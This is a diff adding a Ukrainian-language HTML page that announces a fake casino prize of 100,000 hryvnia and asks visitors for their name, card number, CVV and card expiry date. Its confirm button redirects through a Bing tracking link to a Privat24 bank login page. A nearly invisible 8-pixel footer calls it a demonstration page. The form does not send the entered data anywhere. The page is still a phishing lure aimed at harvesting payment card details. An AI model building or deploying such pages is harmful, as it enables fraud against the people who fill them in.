@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="uk">
+c<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎰 Вітаємо з виграшем!</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: radial-gradient(circle, #1a1a1a, #000);
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+/* Контейнер */
+.container {
+    width: 480px;
+    padding: 30px;
+    padding-right: 30px;
+    border-radius: 20px;
+    background: rgba(0,0,0,0.8);
+    box-shadow: 0 0 30px gold;
+    text-align: center;
+    animation: glow 2s infinite alternate;
+}
+
+@keyframes glow {
+    from { box-shadow: 0 0 20px gold; }
+    to { box-shadow: 0 0 40px red; }
+}
+
+/* Заголовок */
+h1 {
+    color: gold;
+    font-size: 32px;
+    margin-bottom: 10px;
+    animation: blink 1.5s infinite;
+}
+
+@keyframes blink {
+    50% { opacity: 0.6; }
+}
+
+/* Опис */
+.description {
+    font-size: 15px;
+    color: #ddd;
+    margin-bottom: 20px;
+}
+
+/* Поля */
+.input-group {
+    position: relative;
+    margin-bottom: 20px;
+}
+
+input {
+    width: 93%;
+    padding: 16px;
+    border-radius: 10px;
+    border: none;
+    background: #222;
+    color: white;
+    font-size: 16px;
+    outline: none;
+    transition: 0.3s;
+    text-align: center;
+    margin-right: 30px;
+
+}
+
+input:focus {
+    box-shadow: 0 0 10px gold;
+    transform: scale(1.03);
+}
+
+/* Плаваючі label */
+label {
+    position: absolute;
+    left: 12px;
+    top: 14px;
+    color: #aaa;
+    font-size: 14px;
+    transition: 0.3s;
+    pointer-events: none;
+}
+
+input:focus + label,
+input:not(:placeholder-shown) + label {
+    top: -8px;
+    font-size: 12px;
+    color: gold;
+}
+
+/* Кнопка */
+button {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(45deg, red, orange);
+    color: white;
+    font-size: 18px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 15px red;
+}
+
+/* Декор */
+.coins {
+    font-size: 22px;
+    margin-bottom: 10px;
+    animation: float 2s infinite ease-in-out;
+}
+
+@keyframes float {
+    50% { transform: translateY(-5px); }
+}
+
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="coins">💰💰💰</div>
+
+<h1>Вітаємо!</h1>
+
+<p class="description">
+Ви стали учасником спеціальної промо-акції 🎉<br><br>
+🎰 Система випадковим чином обрала ваш профіль як переможця.<br>
+💰 Потенційний виграш: <b>100 000 грн</b><br><br>
+Щоб підтвердити участь у розіграші, будь ласка, заповніть форму нижче.
+</p>
+
+<form>
+    <div class="input-group">
+        <input type="text" required placeholder=" ">
+        <label>Ваше ім'я та прізвище</label>
+    </div>
+
+    <div class="input-group">
+        <input type="text" required placeholder=" " >
+        <label>Номер картки</label>
+    </div>
+
+    <div class="input-group">
+        <input type="text" required placeholder=" ">
+        <label>CVV (CVC)</label>
+    </div>
+    
+    <div class="input-group">
+        <input type="month" required placeholder=" ">
+        <label>Дата закінчення терміну</label>
+    </div>
+
+    <button type="button" onclick="window.location.href='https://www.bing.com/ck/a?!&&p=f274469d60f27d1c501a60c164cc3c4fee29d627b4701a7cabdbfa45bc7ab4c0JmltdHM9MTc3NTY5MjgwMA&ptn=3&ver=2&hsh=4&fclid=3a56fe07-43ab-6204-2846-e931429e638b&psq=%d0%bf%d1%80%d0%b8%d0%b2%d0%b0%d1%82+24+%d0%b2%d1%85%d1%96%d0%b4+%d0%b2+%d0%be%d1%81%d0%be%d0%b1%d0%b8%d1%81%d1%82%d0%b8%d0%b9+%d0%ba%d0%b0%d0%b1%d1%96%d0%bd%d0%b5%d1%82&u=a1aHR0cHM6Ly9uZXh0LnByaXZhdDI0LnVhL2xvZ2luP3Bob25lPSszODA2ODA0MDM0MTEmbGFuZz11YQ';" >Підтвердити участь 🎰</button>
+
+</form>
+
+<p style="font-size:8px; color:#888; margin-top:15px;">
+* Це демонстраційна сторінка. Не вводьте реальні конфіденційні дані.
+</p>
+
+</div>
+
+</body>
+</html>
